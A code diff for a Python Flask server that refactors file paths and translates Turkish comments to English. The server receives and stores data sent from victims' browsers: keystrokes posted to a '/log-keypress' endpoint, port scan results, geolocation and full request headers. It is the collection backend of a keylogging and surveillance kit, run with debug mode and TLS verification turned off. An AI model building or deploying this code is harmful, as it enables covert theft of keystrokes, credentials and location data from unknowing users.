@@ -1,28 +1,35 @@
 from flask import Flask, request, jsonify, render_template
-import logging
 import json
 import requests
+import os
 
 app = Flask(__name__)
 
-# Flask loglama dosyasini ayarlama
-general_log_file = 'logs.json'
-port_scan_file = "scan.json"
-keylogger_file = "keylogger.json"
-geo_location_file = "geolocation.json"
+# Create the logs directory path
+log_directory = "logs"
+
+# Create the directory if it does not exist
+if not os.path.exists(log_directory):
+    os.makedirs(log_directory)
+
+# Update the file paths
+general_log_file = os.path.join(log_directory, 'logs.json')
+port_scan_file = os.path.join(log_directory, "scan.json")
+keylogger_file = os.path.join(log_directory, "keylogger.json")
+geo_location_file = os.path.join(log_directory, "geolocation.json")
 
 @app.route('/')
 def index():    
-    # Ana sayfa template'ini dondur
+    # Return the main page template
     return render_template('index.html')
 
 @app.route('/admin')
 def nmap():
-    # Admin sayfasini render et
+    # Render the admin page
     return render_template('admin.html')
 
 def ip_lookup(ip="127.0.0.1"):
-    # IP adresi sorgulama fonksiyonu
+    # IP address lookup function
     url = "https://api.incolumitas.com/"
     params = {
         'q': ip
@@ -30,35 +37,35 @@ def ip_lookup(ip="127.0.0.1"):
     
     response = requests.get(url, params=params, verify=False)
 
-    # Eger istek basariliysa
+    # If the request is successful
     if response.status_code == 200:
-        lookup = response.json()  # JSON yanitini parse et
+        lookup = response.json()  # Parse the JSON response
     else:
-        print(f"Lookup unsuccessfull, status code: {response.status_code}")
+        print(f"Lookup unsuccessful, status code: {response.status_code}")
 
     return lookup
 
 @app.route('/log', methods=['POST'])
 def log_data():
-    # Gelen JSON verisini al
+    # Get the incoming JSON data
     data = request.json
     
-    client_ip = request.remote_addr  # Istegi yapan IP adresini al
-    request_method = request.method  # Istek metodunu al (GET, POST vs.)
-    request_url = request.url  # Istek URL'sini al
-    request_headers = dict(request.headers)  # Istek header'larini al
+    client_ip = request.remote_addr  # Get the IP address of the request
+    request_method = request.method  # Get the request method (GET, POST, etc.)
+    request_url = request.url  # Get the request URL
+    request_headers = dict(request.headers)  # Get the request headers
 
-    # Log verisini hazirla
+    # Prepare the log entry
     log_entry = {
         "client_ip": client_ip,
         "request_method": request_method,
         "request_url": request_url,
         "request_headers": request_headers,
         "js_data": data,
-        "ip_lookup": ip_lookup(client_ip)  # Ornek olarak bir IP sorgusu yap
+        #"ip_lookup": ip_lookup(client_ip)  # don't need
     }
 
-    # Log verisini dosyaya yaz
+    # Write the log entry to the file
     with open(general_log_file, "a") as f:
         json.dump(log_entry, f, indent=4)
         f.write("\n")
@@ -67,28 +74,26 @@ def log_data():
 
 @app.route('/log-keypress', methods=['POST'])
 def logger():
-    # Gelen JSON verisini al
+    # Get the incoming JSON data
     data = request.json
-    client_ip = request.remote_addr  # Istegi yapan IP adresini al
+    client_ip = request.remote_addr  # Get the IP address of the request
 
-    # IP adresini data'ya ekle
+    # Add the IP address to the data
     data_with_ip = {
         "ip": client_ip,
         **data
     }
 
-    # Klavye tuslarinin logunu dosyaya yaz
+    # Write the keypress logs to the file
     with open(keylogger_file, "a") as f:
         json.dump(data_with_ip, f)
         f.write("\n")
 
     return jsonify({"status": "success"}), 200
 
-
-
 @app.route('/ports', methods=['POST'])
 def scan_results():
-    # Gelen JSON verisini al
+    # Get the incoming JSON data
     data = request.json
     if not data or 'ip' not in data or 'open_ports' not in data:
         return jsonify({"error": "Invalid data"}), 400
@@ -96,7 +101,7 @@ def scan_results():
     ip = data['ip']
     open_ports = data['open_ports']
 
-    # Sonuclari dosyaya kaydet
+    # Save the results to the file
     with open(port_scan_file, 'a') as file:
         file.write(f"IP: {ip} - Open Ports: {', '.join(map(str, open_ports))}\n")
 
@@ -110,7 +115,7 @@ def log_geolocation():
     if data:
         client_ip = request.remote_addr
         
-        # IP adresini data'ya ekle
+        # Add the IP address to the data
         geo_data_with_ip = {
             "ip": client_ip,
             **data
@@ -122,5 +127,5 @@ def log_geolocation():
     return jsonify({'status': 'error', 'message': 'No data received'}), 400
 
 if __name__ == '__main__':
-    # Flask uygulamasini baslat
+    # Start the Flask application
     app.run(host="0.0.0.0", port=5000, debug=True)
